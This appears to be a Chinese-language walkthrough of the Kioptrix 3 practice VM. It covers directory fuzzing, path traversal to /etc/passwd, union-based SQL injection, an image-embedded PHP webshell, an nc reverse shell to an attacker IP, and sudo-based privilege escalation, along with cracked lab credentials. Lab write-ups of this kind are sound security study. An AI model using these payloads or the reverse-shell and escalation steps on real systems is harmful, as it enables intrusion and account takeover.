# 扫描

>开放了80和22端口，22端口有用户名枚举漏洞


## web枚举

* **web fuzz**
```shell
[16:04:36] Starting:
[16:04:39] 403 -  332B  - /.ht_wsr.txt
[16:04:39] 403 -  335B  - /.htaccess.bak1
[16:04:39] 403 -  335B  - /.htaccess.orig
[16:04:39] 403 -  337B  - /.htaccess.sample
[16:04:39] 403 -  335B  - /.htaccess_orig
[16:04:39] 403 -  333B  - /.htaccess_sc
[16:04:39] 403 -  336B  - /.htaccess_extra
[16:04:39] 403 -  333B  - /.htaccessOLD
[16:04:39] 403 -  335B  - /.htaccess.save
[16:04:39] 403 -  325B  - /.htm
[16:04:39] 403 -  326B  - /.html
[16:04:39] 403 -  334B  - /.htaccessOLD2
[16:04:39] 403 -  335B  - /.htpasswd_test
[16:04:39] 403 -  331B  - /.htpasswds
[16:04:39] 403 -  333B  - /.htaccessBAK
[16:04:39] 403 -  332B  - /.httr-oauth
[16:05:04] 301 -  355B  - /cache  ->  http://192.168.80.152/cache/
[16:05:08] 301 -  354B  - /core  ->  http://192.168.80.152/core/
[16:05:08] 200 -  688B  - /core/fragments/moduleInfo.phtml
[16:05:09] 403 -  325B  - /data
[16:05:09] 403 -  326B  - /data/
[16:05:09] 403 -  337B  - /data/adminer.php
[16:05:09] 403 -  337B  - /data/autosuggest
[16:05:09] 403 -  350B  - /data/DoctrineORMModule/cache/
[16:05:09] 403 -  334B  - /data/backups/
[16:05:09] 403 -  350B  - /data/DoctrineORMModule/Proxy/
[16:05:09] 403 -  332B  - /data/files/
[16:05:09] 403 -  331B  - /data/logs/
[16:05:09] 403 -  330B  - /data/tmp/
[16:05:09] 403 -  332B  - /data/cache/
[16:05:09] 403 -  332B  - /data/debug/
[16:05:09] 403 -  335B  - /data/sessions/
[16:05:16] 200 -   23KB - /favicon.ico
[16:05:18] 301 -  357B  - /gallery  ->  http://192.168.80.152/gallery/
[16:05:42] 301 -  357B  - /modules  ->  http://192.168.80.152/modules/
[16:05:43] 200 -    2KB - /modules/
[16:05:50] 301 -  360B  - /phpmyadmin  ->  http://192.168.80.152/phpmyadmin/
[16:05:53] 200 -    8KB - /phpmyadmin/
[16:05:53] 200 -    8KB - /phpmyadmin/index.php
[16:05:53] 401 -  520B  - /phpmyadmin/scripts/setup.php
[16:06:01] 403 -  334B  - /server-status
[16:06:01] 403 -  335B  - /server-status/
[16:06:07] 301 -  355B  - /style  ->  http://192.168.80.152/style/
[16:06:12] 200 -   18B  - /update.php

```

> 查看首页点击blog搜集到了一个域名，点击login可以看到CMS的名字，对页面url进行查看，发现可能存在包含，对路径进行测试。

`http://192.168.80.153/index.php?system=../../../../../../../../etc/passwd%00.jpg`

> 暴露出了两个用户名 dreg 和 loneferret

*  **LotusCMS漏洞尝试**

> 在google搜索漏洞库，`inurl:www.exploit-db.com LotusCMS` 发现了msf中有现成的利用，但是简单尝试后失败，并不存在漏洞


* **SQL注入**
> 将之前得到的域名与本地hosts文件绑定,然后尝试fuzz子域名,发现没有子域

![[Pasted image 20240123202100.png]]

> 查看页面源码发现了一个目录，结合扫描结果对gallery目录进行枚举，发现了version.txt和网站后台

![[Pasted image 20240123202321.png]]
> 通过version.txt暴露出的版本，查找公开漏洞。发现个sql注入

![[Pasted image 20240123202503.png]]



* gallery 目录的扫描
```shell
[17:10:32] Starting: gallery/
[17:10:35] 403 -  340B  - /gallery/.ht_wsr.txt
[17:10:35] 403 -  343B  - /gallery/.htaccess.bak1
[17:10:35] 403 -  345B  - /gallery/.htaccess.sample
[17:10:35] 403 -  343B  - /gallery/.htaccess.orig
[17:10:35] 403 -  343B  - /gallery/.htaccess_orig
[17:10:35] 403 -  344B  - /gallery/.htaccess_extra
[17:10:35] 403 -  341B  - /gallery/.htaccessOLD
[17:10:35] 403 -  342B  - /gallery/.htaccessOLD2
[17:10:35] 403 -  343B  - /gallery/.htaccess.save
[17:10:35] 403 -  333B  - /gallery/.htm
[17:10:35] 403 -  341B  - /gallery/.htaccessBAK
[17:10:35] 403 -  334B  - /gallery/.html
[17:10:35] 403 -  341B  - /gallery/.htaccess_sc
[17:10:35] 403 -  339B  - /gallery/.htpasswds
[17:10:35] 403 -  340B  - /gallery/.httr-oauth
[17:10:35] 403 -  343B  - /gallery/.htpasswd_test
[17:11:11] 200 -    3KB - /gallery/db.sql
[17:11:17] 301 -  364B  - /gallery/gadmin  ->  http://192.168.80.152/gallery/gadmin/
[17:11:17] 200 -    2KB - /gallery/gallery.php
[17:11:26] 500 -    2KB - /gallery/login.php
[17:11:27] 500 -    2KB - /gallery/logout.php
[17:11:36] 500 -    1KB - /gallery/p.php
[17:11:37] 301 -  364B  - /gallery/photos  ->  http://192.168.80.152/gallery/photos/
[17:11:37] 500 -    1KB - /gallery/photos.php
[17:11:44] 500 -    2KB - /gallery/profile.php
[17:11:45] 200 -   87B  - /gallery/readme.html
[17:11:46] 500 -  725B  - /gallery/register.php
[17:11:49] 500 -  725B  - /gallery/search.php
[17:11:59] 500 -    3KB - /gallery/tags.php
[17:12:01] 200 -    1KB - /gallery/themes/
[17:12:01] 301 -  364B  - /gallery/themes  ->  http://192.168.80.152/gallery/themes/
[17:12:06] 200 -   56B  - /gallery/version.txt
```

>尝试注入

```sql
http://kioptrix3.com/gallery/gallery.php?id=1 or 1=2#

当注入点为6时，暴露出了回显点，为2

http://kioptrix3.com/gallery/gallery.php?id=1 or 1=2 union select 1,2,3,4,5,6#

数据库名为gallery

http://kioptrix3.com/gallery/gallery.php?id=1 or 1=2 union select 1,table_name,3,4,5,6 from information_schema.tables where table_schema='gallery' #

得到感兴趣的表名为，gallarific_users

用扫描得到的dbsql查看后得到字段username password

最终得到了用户名密码
	admin：n0t7t1k4
```

> 登录web后台后，经过测试，发现如果直接上传图片会失败，使用修改当前图片的方式进行上传，测试发现直接在图片中写入反弹sh不成功

* 图片马
> 将图片马内容写为:<?=`$_POST[0]`?>.上传后发现可以执行命令。枚举可以反弹shell的程序，发现了nc

`nc -e /bin/bash 172.26.32.20 4444`

## 提权

```
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/apache2/suexec
/usr/lib/pt_chown
/usr/bin/arping
/usr/bin/mtr
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/at
/usr/bin/sudoedit
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/traceroute6.iputils
/usr/local/bin/ht
/usr/sbin/pppd
/usr/sbin/uuidd
/lib/dhcp3-client/call-dhclient-script
/bin/fusermount
/bin/ping
/bin/mount
/bin/umount
/bin/ping6
/bin/su
```

> 发现权限不够而且无法提权

* sql注入新发现

> 继续对数据库进行枚举，发现了另外一个用户表dev_accounts，经过枚举后得到账号和hash

dreg:0d3eccfb887aabd50f243b3f155c0f85  -> Mast3r
loneferret:5badcaf789d3d1d09794d8f021f40f0e -> starwars

最后通过sudo ht修改/etc/passwd的loneferret用户uid提权







